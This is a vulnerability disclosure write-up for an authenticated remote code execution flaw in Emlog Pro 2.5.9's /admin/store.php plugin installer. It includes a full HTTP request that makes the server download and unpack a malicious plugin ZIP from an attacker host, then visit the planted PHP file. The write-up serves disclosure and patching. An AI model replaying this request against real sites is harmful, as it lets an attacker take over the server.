# Emlog Pro <= 2.5.9 has a file upload vulnerability
##### Vulnerability Location: /admin/store.php
##### Affected Range: <= Emlog Pro 2.5.9
##### Vulnerability Cause: The store.php component contains a critical security flaw where it fails to properly validate the contents of remotely downloaded ZIP plugin files. This insufficient validation allows attackers to execute arbitrary code on the vulnerable system.
##### Vulnerability Impact: Full Server Takeover
##### Link:https://github.com/emlog/emlog/releases/tag/pro-2.5.9

# Vulnerability recurrence
Download the source code, using phpstudy structures, environment, the interface is as follows:
<img width="1105" alt="image" src="https://github.com/user-attachments/assets/e4ee2f05-0c44-4fc7-9ae2-7a23d5e007c5" />
Log in to the background to grab data packets and obtain Cookie information.Local host starts http service:
<img width="1093" alt="image" src="https://github.com/user-attachments/assets/bae62b05-6b93-47b2-872d-52a6cb1c8816" />
Here is a constructed malicious zip packet:
<img width="1096" alt="image" src="https://github.com/user-attachments/assets/8d2aa04a-14d6-47e3-afd6-470607c8da0a" />
Folder name: test_plugin, php script file name: test_plugin, and the final compressed package is:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/7292c3e3-c0d2-4537-8c45-55ab3fe916f7" />

Construct the packet for remote plug-in download:
```
GET /admin/store.php?action=install&cdn_source=http://192.168.20.186:8087/test_plugin.zip&type=zip&source=1 HTTP/1.1
Host: 10.211.55.4:82
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://10.211.55.4:82/admin/blogger.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Cookie: EM_AUTHCOOKIE_UQ2YAjeQk9zyxkO70SX5UZGn1DAa8aHt=admin%7C0%7Ccda059d0dc84704de2377a0c2dba5306; PHPSESSID=oqdpbog0gu1jebnqi7c3h1svc6
Priority: u=0, i
```
URL address: https://www.xkqq.top/admin/store.php?action=install&cdn_source=http://192.168.20.186:8087/test_plugin.zip&type=zip&source=1
<img width="1150" alt="image" src="https://github.com/user-attachments/assets/def267e9-93b5-4c24-a84d-de64cbf20603" />
The command output indicates that the installation is successful. Try to visit: http://10.211.55.4:82/content/plugins/test_plugin/test_plugin.php
<img width="1023" alt="image" src="https://github.com/user-attachments/assets/96ae5fde-7b59-4843-981d-f09e4b6d4505" />
# Code Analysis
Line 192 of `/admin/store.php`

<img width="681" alt="image" src="https://github.com/user-attachments/assets/226527d4-d885-4791-a7f0-6f6504177fe0" />

Finally, the self-extracting method is called to extract the remote malicious file, thus implementing RCE

```$ret = emUnZip($temp_file, $unzip_path, $source_type);```
